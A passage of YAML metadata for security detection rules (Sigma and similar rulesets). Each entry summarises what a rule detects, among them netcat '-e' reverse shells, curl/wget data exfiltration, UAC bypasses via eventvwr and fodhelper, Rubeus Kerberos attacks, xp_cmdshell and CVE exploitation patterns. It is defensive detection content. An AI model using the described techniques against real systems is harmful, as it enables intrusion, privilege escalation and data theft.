    attempt was successful. Potential false positives may arise from vulnerability
    scanners against hosts configured to return 200 status codes regardless of errors.
  Updated-Date: '2024_09_03'
7b836d7f-179c-4ba4-90a7-a7e60afb48e6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a2ce791f0f0b314c89cb12656b391e76
  Ruleset: sigmahq
  Summary: This rule detects the use of the PowerShell cmdlet `Invoke-Command` on
    a remote host, indicating potential lateral movement by adversaries leveraging
    valid accounts and Windows Remote Management (WinRM). The adversary may use this
    technique to execute commands on remote systems as the logged-on user, enabling
    them to perform various malicious activities under the credentials of the legitimate
    user.
  Updated-Date: '2024_09_04'
7ba05b43-adad-4c02-b5e9-c8c35cdf9fa8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 789f5cbcdebe745c3bdbdb65c54ddc45
  Ruleset: core
  Summary: "This rule detects the exploitation of the Nimbuspwn privilege escalation\
    \ vulnerability, identified by CVE-2022-29799 and CVE-2022-29800, on Linux systems.\
    \ The vulnerability involves specific error handling notifications related to\
    \ the networkd-dispatcher service and can lead to unauthorized escalation of privileges.\
    \ Indicators of exploitation include log entries containing patterns such as \u201C\
    networkd-dispatcher,\u201D \u201CError handling notification for interface,\u201D\
    \ and paths with \u201C../../\u201D. The rule aims to identify potential abuse\
    \ by monitoring these specific log entries and notifying administrators of high-risk\
    \ activity."
  Updated-Date: '2024_09_03'
7ba08e95-1e0b-40cd-9db5-b980555e42fd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 485e1da9b8c837404ce5467ab3158bc9
  Ruleset: emerging-threats
  Summary: This rule detects suspicious behaviors associated with the actor tracked
    by Microsoft as SOURGUM, which are indicative of potential malicious activity.
    SOURGUM has been linked to the use of specific filenames and registry keys, such
    as 'windows\system32\Physmem.sys' and malicious registry commands involving 'HKEY_LOCAL_MACHINE\software\classes\clsid\'.
    Monitoring these patterns can help identify actions related to persistence mechanisms
    and privilege escalation typically employed by the SOURGUM actor. The rule focuses
    on process creation activities within Windows environments and aims to detect
    emerging threats by observing the properties associated with SOURGUM's behavior.
  Updated-Date: '2024_09_03'
7bbc309f-e2b1-4eb1-8369-131a367d67d3:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 94aa468a298dc9715dfda63c1a44124d
  Ruleset: core
  Summary: This rule detects an event where there are an unusually high number of
    accounts assigned the Global Administrator role in Azure. This can indicate potential
    issues with privilege escalation or improper role assignment, which can pose significant
    security risks. It is important to investigate this alert to ensure that the elevated
    number of Global Administrators is intentional and not the result of a misconfiguration
    or a security breach.
  Updated-Date: '2024_09_03'
7bd3902d-8b8b-4dd4-838a-c6862d40150d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a86b94aa44df4c462e311ea299494475
  Ruleset: core
  Summary: This rule detects the Azure Hybrid Connection Manager services querying
    the Azure Service Bus service by monitoring DNS queries containing 'servicebus.windows.net'
    and images related to 'HybridConnectionManager'. It is designed to identify potential
    persistence techniques and unauthorized actions in a Windows environment by leveraging
    the Hybrid Connection Manager. However, legitimate use of the Azure Hybrid Connection
    Manager with the Azure Service Bus service may trigger false positives.
  Updated-Date: '2024_09_03'
7bdde3bf-2a42-4c39-aa31-a92b3e17afac:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 24362e3de29ebeefdd850a3c93abcd79
  Ruleset: core
  Summary: This rule detects the process injection activity of malicious documents
    (Maldoc) generated by the LittleCorporal tool. It specifically monitors for instances
    where "winword.exe" attempts to interact with the .NET Framework components, suggesting
    a potential injection activity characteristic of this malware.
  Updated-Date: '2024_09_03'
7bdf2a7c-3acc-4091-9581-0a77dad1c5b5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de54581312398f7fc4da7f8b3c6c1c04
  Ruleset: emerging-threats
  Summary: This rule detects persistence mechanisms used by the OilRig advanced persistent
    threat (APT) group, specifically through modifications in the Windows Registry.
    The detection focuses on changes to registry keys located at 'SOFTWARE\Microsoft\Windows\CurrentVersion\UMe'
    and 'SOFTWARE\Microsoft\Windows\CurrentVersion\UT'. The report by Nyotron from
    March 2018 provides the context for this behavior, highlighting its use for maintaining
    persistence on infected systems. This activity is associated with various tactics
    including persistence, defense evasion, and command-and-control communications.
  Updated-Date: '2024_09_03'
7c0dcd3d-acf8-4f71-9570-f448b0034f94:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 11a0e8a0512aff09a8e2123225453ba9
  Ruleset: core
  Summary: This rule detects the suspicious execution of a child process by the PSEXESVC
    service running as the LOCAL_SYSTEM user on a Windows system. This scenario indicates
    that a remote command was initiated with the highest privileges, utilizing the
    PsExec tool to surpass standard user account permissions, such as those of an
    administrator.
  Updated-Date: '2024_09_03'
7c3b43d8-d794-47d2-800a-d277715aa460:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7fbd54a6fb26e799e4882d11c61c9a57
  Ruleset: sigmahq
  Summary: This rule detects the abuse of the cron utility on MacOS to schedule tasks
    for the initial or recurring execution of malicious code, specifically focusing
    on crontab jobs that are uploaded from the tmp folder. Cron is a time-based job
    scheduler in Unix-like operating systems, used for executing scripts or commands
    at specified times or intervals. The rule identifies suspicious cron activities
    that may indicate attempts at persistence or privilege escalation by inspecting
    processes that invoke the crontab utility with commands related to the tmp directory.
  Updated-Date: '2024_09_04'
7c64e577-d72e-4c3d-9d75-8de6d1f9146a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4a55a9c2a7626bde14844d4c41e1edc9
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit CVE-2020-0688, a vulnerability in
    Microsoft Exchange Control Panel (ECP) that allows attackers to execute arbitrary
    code on vulnerable Exchange servers. The detection focuses on specific patterns
    in web server requests, specifically examining queries to the '/ecp/default.aspx'
    endpoint containing the parameters '__VIEWSTATEGENERATOR=' and '__VIEWSTATE='.
  Updated-Date: '2024_09_03'
7c81fec3-1c1d-43b0-996a-46753041b1b6:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 09753592d87678fcca8a67ec9bfb1b8b
  Ruleset: core
  Summary: This rule detects a UAC (User Account Control) bypass method utilizing
    the Windows Event Viewer. By manipulating the Windows registry, attackers can
    hijack the process launched by Event Viewer (`eventvwr.exe`) to execute arbitrary
    commands with elevated privileges. This particular technique is associated with
    fileless UAC bypassing and poses a significant security risk as it circumvents
    standard privilege escalation protections. The rule focuses on monitoring specific
    changes to the registry that indicate this type of attack.
  Updated-Date: '2024_09_03'
7c8af9b2-dcae-41a2-a9db-b28c288b5f08:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 159d962d6a3045e345aa058475c9e896
  Ruleset: sigmahq
  Summary: This rule detects the use of "appcmd" to create new global URL rewrite
    rules in an IIS environment. Threat actors have been observed employing this behavior
    to add rules that enable them to access their webshells. The detection focuses
    on processes involving "appcmd.exe" and command lines containing specific keywords
    related to setting and configuring global rewrite rules in the IIS server. Legitimate
    usage of "appcmd" to add new URL rewrite rules might result in false positives.
  Updated-Date: '2024_09_04'
7c97c625-0350-4f0a-8943-f6cadc88125e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c1b253a11c1776dbb99a44e0ac324ce
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the Log4J Wstomcat process, which is
    associated with Mint Sandstorm activity. Specifically, it monitors for instances
    where the parent process is 'ws_tomcatservice.exe' and ensures that the process
    being run is not 'repadmin.exe'. The aim is to identify suspicious behaviors linked
    to the advanced threat actor Mint Sandstorm, which has been known to refine its
    tactical approaches to target high-value entities.
  Updated-Date: '2024_09_03'
7cb02516-6d95-4ffc-8eee-162075e111ac:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2a69db95c6a8a69c5403beeb78285ffb
  Ruleset: sigmahq
  Summary: This rule detects successful IIS Shortname Fuzzing scans, which can enumerate
    folders by using the symbol "~". This can happen when an older .NET Framework
    is used in IIS. The rule monitors specific patterns in web server logs, such as
    query strings containing "~1" and requests ending with "a.aspx" using the GET
    or OPTIONS methods, that result in status codes of 200 or 301. Misidentifications
    are not specifically known.
  Updated-Date: '2024_09_04'
7cce6fc8-a07f-4d84-a53e-96e1879843c9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 351fc6537c179c5d231bd41f21b82589
  Ruleset: sigmahq
  Summary: This rule detects binaries that mimic the names of legitimate Sysinternals
    tools, which are used for system monitoring, maintenance, and troubleshooting
    in Windows environments. Such mimicry is an evasion technique to avoid detection
    by leveraging trusted names from the Sysinternals suite. The rule looks for the
    execution of file names that match those of genuine Sysinternals tools, such as
    `accesschk.exe`, `procdump.exe`, and `sysmon.exe`, among others. It filters out
    binaries identified as genuinely from Sysinternals based on the company information
    metadata.
  Updated-Date: '2024_09_04'
7cd1dcdc-6edf-4896-86dc-d1f19ad64903:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28de0633a7c34194af76c3726020e89a
  Ruleset: sigmahq
  Summary: This rule detects network connections initiated by a process on a system
    to Cloudflared tunnels domains. Cloudflared tunnels can be exploited by attackers
    to establish a reverse shell or maintain persistence on a compromised machine,
    posing significant security risks.
  Updated-Date: '2024_09_04'
7cded4b3-f09e-405a-b96f-24248433ba44:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2fba24be707c96d6d1cd2740cbf41f4e
  Ruleset: sigmahq
  Summary: This rule detects instances where an NTP (Network Time Protocol) service
    on an OpenCanary node has received an NTP monlist request. OpenCanary is a honeypot
    framework used to simulate various network services, and the NTP monlist request
    can be leveraged for reconnaissance activities, as it provides a list of the last
    NTP clients that accessed the server. Detecting such requests is important as
    they may indicate attempts to gather information about network activities.
  Updated-Date: '2024_09_04'
7cff77e1-9663-46a3-8260-17f2e1aa9d0a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b71e1d7aad44301ae11d18f5f27f75f7
  Ruleset: sigmahq
  Summary: This rule detects DNS queries made by "AppInstaller.EXE", the default handler
    for the "ms-appinstaller" URI. The file attempts to load or install a package
    from a referenced URL.
  Updated-Date: '2024_09_04'
7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 34e17d667609f29201cd081b5ae29845
  Ruleset: core
  Summary: This rule detects execution of specific commandlets associated with well-known
    PowerShell exploitation frameworks. Such commandlets include a variety of actions
    such as persistence mechanisms, exfiltration processes, credential dumping, and
    system enumeration among others. The commandlets are utilized in various malicious
    activities such as backdoors, privilege escalation, reconnaissance, DNS manipulation,
    and data exfiltration. The detection spans multiple PowerShell tools and scripts
    commonly used by attackers, indicating potential malicious activity.
  Updated-Date: '2024_09_03'
7d1aaf3d-4304-425c-b7c3-162055e0b3ab:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4261b550b83c731eae50959f5136d6e9
  Ruleset: core
  Summary: This rule detects the use of various command-line interface (CLI) utilities,
    such as PowerShell, cmd.exe, curl.exe, and wget.exe, that may be exfiltrating
    data via web requests on Windows systems. It identifies specific patterns in the
    command line that indicate the use of web request commands like 'Invoke-WebRequest',
    'wget', and 'curl', particularly when combined with arguments related to data
    transfer ('-ur', '-method', '--post-data') and data manipulation commands like
    'Get-Content', 'ipconfig', 'systeminfo', and 'ToBase64String'. The detection aims
    to flag potential data exfiltration by monitoring these command-line activities
    for suspicious behavior such as reading system files and converting them to a
    base64 format for transmission.
  Updated-Date: '2024_09_03'
7d416556-6502-45b2-9bad-9d2f05f38997:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fcf142dc9001da9f67eb535c1969646d
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell commands by adversaries to enumerate
    sensitive files on a Windows system. Specifically, it identifies instances where
    script blocks contain commands such as "ls", "get-childitem", or "gci" combined
    with the "-recurse" flag, and target files with extensions like ".pass", ".kdbx",
    or ".kdb". These patterns suggest an attempt to locate and access sensitive files,
    potentially indicating malicious activity.
  Updated-Date: '2024_09_04'
7d4aaec2-08ed-4430-8b96-28420e030e04:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ccd6b6a6ea23a690fded42dd170a1c01
  Ruleset: sigmahq
  Summary: This rule detects uncommon child processes spawned from "sigverif.exe,"
    a utility in Windows used for file signature verification. The occurrence of unexpected
    child processes may suggest malicious use of sigverif.exe as a living-off-the-land
    binary, potentially to proxy execution. The detection is focused on process creation
    logs and aims to filter out normal instances such as "WerFault.exe," thereby highlighting
    suspicious activities linked to sigverif.exe.
  Updated-Date: '2024_09_04'
7d4cdc5a-0076-40ca-aac8-f7e714570e47:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ce35a0616600032fa52d39301fb6931b
  Ruleset: core
  Summary: This rule detects the execution of the Microsoft Connection Manager Profile
    Installer (CMSTP) by identifying instances of the `cmstp.exe` process creating
    child processes. CMSTP is a utility that can be used for legitimate purposes,
    but it is also known for being exploited to bypass User Account Control (UAC)
    and execute code covertly. The detection focuses on process creation logs within
    Windows and scrutinizes the command lines of these processes to identify suspicious
    activity associated with CMSTP. Legitimate use of CMSTP is considered unlikely
    in modern enterprise environments.
  Updated-Date: '2024_09_03'
7d604714-e071-49ff-8726-edeb95a70679:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7f3f2e923965dc8bc4313b6eb2afbdd6
  Ruleset: core
  Summary: This rule detects programs on a Windows system that are not typically associated
    with writing scripts to disk. It focuses on specific executable files that, if
    they generate script files such as .ps1, .bat, .vbs, .scf, .wsf, or .wsh, may
    indicate potential misuse or malicious activity. These executables include a variety
    of legitimate tools such as Microsoft Office programs, certain Windows utilities,
    and executables that are not expected to perform such actions under normal circumstances.
    The rule aims to identify suspicious behavior that could signify defense evasion
    tactics or other malicious activities.
  Updated-Date: '2024_09_03'
7d6d30b8-5b91-4b90-a891-46cccaf29598:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2f9e0dc9dbf652987c79d544c8b34430
  Ruleset: sigmahq
  Summary: This rule detects the use of the "ssh.exe" binary as a proxy to execute
    other programs on a Windows system. It focuses on identifying instances where
    "ssh.exe" is employed with specific command-line arguments related to "ProxyCommand"
    and "LocalCommand," which can be indicative of attempts to evade defense mechanisms
    or perform unauthorized operations. By monitoring the process creation logs and
    analyzing command lines associated with "ssh.exe," the rule aims to spot potentially
    suspicious activities that align with defense evasion techniques. Potential false
    positives include legitimate administrative usage of these commands.
  Updated-Date: '2024_09_04'
7d9263bd-dc47-4a58-bc92-5474abab390c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ade41f515a3b076af222bb7dd745cd03
  Ruleset: sigmahq
  Summary: This rule detects tampering with the "ChannelAccess" registry key to change
    access permissions to Windows event channels. It identifies modifications to specific
    registry paths and access details, checking for certain permission configurations
    such as local administrators or the local system having GENERIC ALL permissions.
    The rule filters out activities related to trusted system processes, like TrustedInstaller.exe
    and TiWorker.exe, to reduce false positives.
  Updated-Date: '2024_09_04'
7d995e63-ec83-4aa3-89d5-8a17b5c87c86:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a28247fee571f2b85eb34eab3da25659
  Ruleset: sigmahq
  Summary: This rule detects the enabling of the "TurnOffCheck" setting in the Windows
    registry, which indicates an attempt to bypass defenses against the MSDT Follina
    vulnerability. Specifically, it monitors for changes in the registry key "\Policies\Microsoft\Windows\ScriptedDiagnostics\TurnOffCheck"
    where the value is set to "0x00000001". This action might be performed by malicious
    actors to evade security measures designed to protect systems from exploitation.
  Updated-Date: '2024_09_04'
7dbb86de-a0cc-494c-8aa8-b2996c9ef3c8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 714d8bcd0ec5e76d6554bf54ed522f91
  Ruleset: emerging-threats
  Summary: This rule detects the use of a Proof of Concept (PoC) tool designed to
    exploit the Local Privilege Escalation (LPE) vulnerability identified as CVE-2021-41379.
    The detection focuses on specific event data from the Windows Application logs,
    particularly looking for Event ID 1033 from 'MsiInstaller' with data containing
    'test pkg'. This vulnerability allows an attacker to increase their privileges
    on the affected system.
  Updated-Date: '2024_09_03'
7dc2dedd-7603-461a-bc13-15803d132355:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 948e7e57c9200d6efb5ca36c522533c1
  Ruleset: sigmahq
  Summary: This rule detects uncommon child processes of "conhost.exe." The appearance
    of these processes may indicate the use of "conhost.exe" as a living-off-the-land
    binary (LOLBIN) or suggest potential process injection activity. This detection
    method helps identify anomalies by monitoring process creation logs, specifically
    focusing on instances where "conhost.exe" spawns child processes that do not match
    typical usage patterns or expected system paths.
  Updated-Date: '2024_09_04'
7df1713a-1a5b-4a4b-a071-dc83b144a101:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 21e33601e945f0f1275588b799ecfdcc
  Ruleset: sigmahq
  Summary: This rule detects the use of the 'esentutl' utility to access NTDS (Active
    Directory database) dumped files. This technique is recommended by the Conti ransomware
    group to its affiliates and is also employed by the Trickbot malware to gather
    Microsoft Edge credentials via its pwgrab module. The detection focuses on specific
    command line patterns indicative of these malicious activities.
  Updated-Date: '2024_09_04'
7e163e96-b9a5-45d6-b2cd-d7d87b13c60b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b24ba2d1f17c87e50ccd970ff14c6067
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a registry value in the ".wav\OpenWithProgIds"
    key with an uncommon name, which could be associated with SNAKE Malware activity
    as reported by the Cybersecurity and Infrastructure Security Agency (CISA). SNAKE
    Malware is a sophisticated cyber espionage tool used for stealing sensitive information.
    This rule aims to identify potential malicious registry modifications used by
    SNAKE Malware for persistence. Additional legitimate processes that write to this
    key may need to be excluded to avoid false positives.
  Updated-Date: '2024_09_03'
7e3c4651-c347-40c4-b1d4-d48590fdf684:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75a103b9cead537a3d1995ab3ff63d34
  Ruleset: core
  Summary: This rule detects the presence of the ld.so preload persistence file on
    Linux systems. The ld.so process can be utilized for code injection, which can
    lead to persistence and privilege escalation attacks. Identifying the /etc/ld.so.preload
    file is a key indicator of this type of suspicious activity.
  Updated-Date: '2024_09_03'
7e6237fe-3ddb-438f-9381-9bf9de5af8d0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 89101acc96411f1b45430b2fbca24dfb
  Ruleset: core
  Summary: This rule detects the usage of the "net.exe" utility to mount an internet-hosted
    WebDav share on a Windows system. It focuses on process creation events where
    either "net.exe" or "net1.exe" is executed with command-line parameters that include
    both "use" and "http", indicating an attempt to establish a WebDav connection
    over HTTP.
  Updated-Date: '2024_09_03'
7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f531f1d737cc987729502e6394df4036
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell scripts executed through
    MSHTA, a Windows utility often utilized by attackers for executing malicious scripts.
    The detection focuses on events where the Service Control Manager logs an event
    indicating the creation of services with image paths containing both 'mshta' and
    'vbscript:createobject', signaling potential malicious activity aimed at defense
    evasion and unauthorized execution of code.
  Updated-Date: '2024_09_03'
7e9cf7b6-e827-11ed-a05b-0242ac120003:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e183c58f5b98d86471d4cae02201d090
  Ruleset: sigmahq
  Summary: This rule detects non-browser processes interacting with the Google API
    endpoints such as "drive.googleapis.com", "oauth2.googleapis.com", "sheets.googleapis.com",
    and "www.googleapis.com". This activity could indicate the use of covert command-and-control
    (C2) techniques, specifically Google Sheet C2 (GC2-sheet). Legitimate processes
    such as popular web browsers and known Google applications are excluded to reduce
    false positives. Further tuning may be necessary to account for legitimate applications
    that communicate with Google APIs but are not included in the predefined exclusions.
  Updated-Date: '2024_09_04'
7ea78478-a4f9-42a6-9dcd-f861816122bf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4dfbe28819d431148cd0c7367117bf43
  Ruleset: sigmahq
  Summary: This rule detects instances where multi-factor authentication (MFA) has
    been disabled in Azure Active Directory. This action could indicate malicious
    activity aimed at bypassing authentication mechanisms to gain unauthorized access.
  Updated-Date: '2024_09_04'
7ec2c172-dceb-4c10-92c9-87c1881b7e18:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 45d1c28824147dfcf1141be961e3bb1e
  Ruleset: core
  Summary: This rule detects the execution of the hacktool Rubeus based on specific
    executable properties and command line parameters. Rubeus is a tool used for Kerberos-related
    operations, such as ticket extraction and manipulation. Indicators of Rubeus activity
    include executable names like 'Rubeus.exe,' and command lines containing terms
    related to various Kerberos attacks, including 'asreproast,' 'kerberoast,' and
    'golden /aes256.' The detection aims to identify unauthorized credential access
    and lateral movement attempts, which are critical security concerns.
  Updated-Date: '2024_09_03'
7ec912f2-5175-4868-b811-ec13ad0f8567:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1c5365b3ae11b37ca99293ecca3d29c5
  Ruleset: emerging-threats
  Summary: This rule detects changes to the "Ports" registry key containing data with
    a Windows path or files with specific suspicious extensions. Such modifications
    could indicate an attempt to exploit CVE-2020-1048, a Windows Print Spooler vulnerability
    that allows elevation of privilege. The rule is applicable to monitoring Windows
    systems and aims to identify potentially malicious activities related to unauthorized
    printer port installations involving executable or script files.
  Updated-Date: '2024_09_03'
7ed2c9f7-c59d-4c82-a7e2-f859aa676099:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7db0cbb453440e1eb1d75d7a5f8d663d
  Ruleset: sigmahq
  Summary: This rule detects when a user manipulates the firmware password on MacOS.
    The detection focuses on the execution of the `/usr/sbin/firmwarepasswd` command
    with specific options including 'setpasswd,' 'full,' 'delete,' and 'check.' These
    actions indicate potential changes to firmware password settings, which may impact
    system security. Notably, this command has been disabled on silicon-based Apple
    computers.
  Updated-Date: '2024_09_04'
7ee0b4aa-d8d4-4088-b661-20efdf41a04c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 24b1b4e83d4822b194288ae3bb6984de
  Ruleset: sigmahq
  Summary: This rule detects when a Kubernetes account accesses sensitive objects
    such as configmaps or secrets within an Azure environment. It monitors activity
    logs for operations like writing or deleting configmaps and secrets. These operations
    may indicate potential tampering or misuse of critical configuration data, which
    could affect the security and stability of containerized environments. If such
    activities are performed by unfamiliar users or systems, further investigation
    is recommended to prevent possible security breaches.
  Updated-Date: '2024_09_04'
7eedcc9d-9fdb-4d94-9c54-474e8affc0c7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7d94ecac8609f663a00ec466f1c7ccad
  Ruleset: sigmahq
  Summary: This rule detects obfuscated PowerShell activity leveraging COMPRESS OBFUSCATION
    techniques. It identifies command lines that include suspicious patterns associated
    with the creation of new objects, ASCII encoding, DeflateStream compression, and
    stream reading, indicative of obfuscation attempts aimed at evading detection
    and executing code.
  Updated-Date: '2024_09_04'
7efd2c8d-8b18-45b7-947d-adfe9ed04f61:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c348e62f78f59850244bb343ef37760
  Ruleset: sigmahq
  Summary: This rule detects the execution of the AgentExecutor.exe binary, a legitimate
    tool that can be exploited to run PowerShell scripts with the "Bypass" ExecutionPolicy
    or any binary named "powershell.exe" located in a path specified by the sixth
    positional argument. It specifically monitors the command line for usage patterns
    that include flags such as "-powershell" or "-remediationScript." The rule aims
    to identify instances where AgentExecutor.exe is used outside of legitimate contexts,
    like Intune management, to mitigate potential abuse.
  Updated-Date: '2024_09_04'
7eff1a7f-dd45-4c20-877a-f21e342a7611:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6826cd27e7eb3698e56ab768cca3af49
  Ruleset: sigmahq
  Summary: This rule detects the creation of the RemCom service file, specifically
    targeting the default RemCom service filename "RemComSvc.exe." Identifying this
    file suggests the installation and execution of the RemCom service. RemCom is
    a software tool used for remote command execution on Windows systems.
  Updated-Date: '2024_09_04'
7f103213-a04e-4d59-8261-213dddf22314:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd4618880e4f3edd827146577096ba23
  Ruleset: core
  Summary: This rule detects the use of the MSSQL stored procedure "xp_cmdshell" to
    execute commands. The "xp_cmdshell" procedure can allow for the execution of arbitrary
    commands, which can be leveraged for malicious activities, such as persistence
    mechanisms in SQL Server environments. Logging of such events requires an appropriate
    MSSQL audit policy to be enabled. The detection relies on specific event IDs and
    data indicating the execution of the "xp_cmdshell" procedure.
  Updated-Date: '2024_09_03'
7f2954d2-99c2-4d42-a065-ca36740f187b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e423a5cb67c6ae8042216b15833e81c0
  Ruleset: sigmahq
  Summary: This rule detects changes to the "DisableHypervisorEnforcedPagingTranslation"
    registry value, where it is set to "1" to disable the Hypervisor Enforced Paging
    Translation feature on Windows systems.
  Updated-Date: '2024_09_04'
7f43c430-5001-4f8b-aaa9-c3b88f18fa5c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1360349c2b4f785b7aa23fac03c1bef0
  Ruleset: sigmahq
  Summary: This rule detects the execution of programs from an Alternate Data Stream
    (ADS) on Windows operating systems. Adversaries may employ this technique to conceal
    their malicious data within NTFS file attributes to avoid detection. The rule
    triggers upon observing specific command-line patterns associated with various
    tools such as 'type', 'makecab', 'reg', 'regedit', and 'esentutl', indicating
    an attempt to manipulate or access ADS. This behavior is often linked to defense
    evasion tactics used by adversaries.
  Updated-Date: '2024_09_04'
7f5d1c9a-3e83-48df-95a7-2b98aae6c13c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b136d39d841e663972f5c3cb990f9460
  Ruleset: sigmahq
  Summary: This rule detects child processes of "provlaunch.exe," indicating potential
    abuse for proxy execution. It focuses on identifying instances where "provlaunch.exe"
    spawns specific child processes that might signify malicious activity. The detection
    includes monitoring process creation logs for parent images ending with '\provlaunch.exe'
    and excludes certain common legitimate processes to reduce false alarms. This
    monitoring is essential in identifying abuse of the "provlaunch.exe" binary, which
    can be exploited for executing commands or scripts indirectly, making it a technique
    for defense evasion in cybersecurity.
  Updated-Date: '2024_09_04'
7f734ed0-4f47-46c0-837f-6ee62505abd9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a7de69b34b1cb010001bf2d91a11269
  Ruleset: core
  Summary: This rule detects the execution of Netcat, a networking utility for reading
    from and writing to network connections, using the "-e" flag followed by common
    shell types. The presence of this command line pattern could indicate an attempt
    to set up a reverse shell, a method often employed by attackers to gain remote
    control of a compromised system. Signs of this activity include the invocation
    of various shells such as bash, sh, csh, ksh, and others. Detecting these specific
    patterns in process creation logs helps identify potentially malicious reverse
    shell setups.
  Updated-Date: '2024_09_03'
7f741dcf-fc22-4759-87b4-9ae8376676a2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4fd8bc610a899831c5a951a6988be4bc
  Ruleset: core
  Summary: This rule detects the use of Fodhelper.exe to bypass User Account Control
    (UAC) in Windows systems. Adversaries exploit this technique to execute processes
    with elevated privileges. The detection mechanism focuses on identifying instances
    where Fodhelper.exe appears as a parent process. Elevated privileges can provide
    unauthorized access and control within the system, making this a critical security
    concern. While legitimate uses of Fodhelper.exe by authorized users exist, this
    activity often signals an attempt to circumvent standard security protocols for
    malicious purposes.
  Updated-Date: '2024_09_03'
7f7c49eb-2977-4ac8-8ab0-ab1bae14730e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28c8d301132938f38fe73c2becc5a28e
  Ruleset: core
  Summary: This rule detects remote Remote Procedure Call (RPC) attempts to read information
    concerning scheduled tasks by monitoring specific event logs generated through
    the RPC Firewall. The focus is on the interface UUID "86d35949-83c9-4044-b424-db363231fd0c"
    and filtering out certain operation numbers which correspond to various scheduled
    task operations. This detection is crucial for identifying reconnaissance activities
    that involve querying scheduled tasks on remote systems, a potential precursor
    to lateral movement in a network.
  Updated-Date: '2024_09_03'
7fb14105-530e-4e2e-8cfb-99f7d8700b66:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 83e3e383b7e82ebebd8dc63d01e45f46
  Ruleset: core
